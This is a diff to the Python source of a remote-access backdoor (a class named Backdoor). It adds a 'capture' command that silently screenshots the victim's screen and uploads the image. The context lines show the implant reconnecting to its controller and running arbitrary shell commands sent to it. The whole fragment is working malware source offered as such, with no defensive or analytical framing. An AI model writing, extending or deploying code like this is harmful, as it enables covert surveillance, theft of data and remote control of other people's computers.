@@ -1,6 +1,7 @@
-import socket,subprocess,os,time
+import socket,subprocess,os,time,tempfile
 from Cryptodome.PublicKey import RSA
 from Cryptodome.Cipher import PKCS1_OAEP
+from mss import mss
 MAX = 1024
 
 class Backdoor:
@@ -182,10 +183,22 @@ uYe3LoP7wDayhDqmdh8O5QzsT93q9V7YwQw1OjQqA20XH+J08nSCjevs/20=
                     self.connect(self.IP, self.PORT)
                 elif cmd[0] == "clear":
                     self.run()
+
+                elif cmd[0] == "capture":
+                    current_dir = os.getcwd()
+                    temp_dir = tempfile.gettempdir()
+                    os.chdir(temp_dir)
+                    with mss() as sct:
+                        sct.shot()
+                    self.upload("monitor-1.png")
+                    os.remove("monitor-1.png")
+                    os.chdir(current_dir)
                 elif len(cmd)>0:
                     cmd = ' '.join(cmd)
                     result = self.exec_cmd(cmd)
-                    self.r_send(result) 
+                    self.r_send(result)
+
+
             except Exception as e:
                 self.connect(self.IP, self.PORT)
 
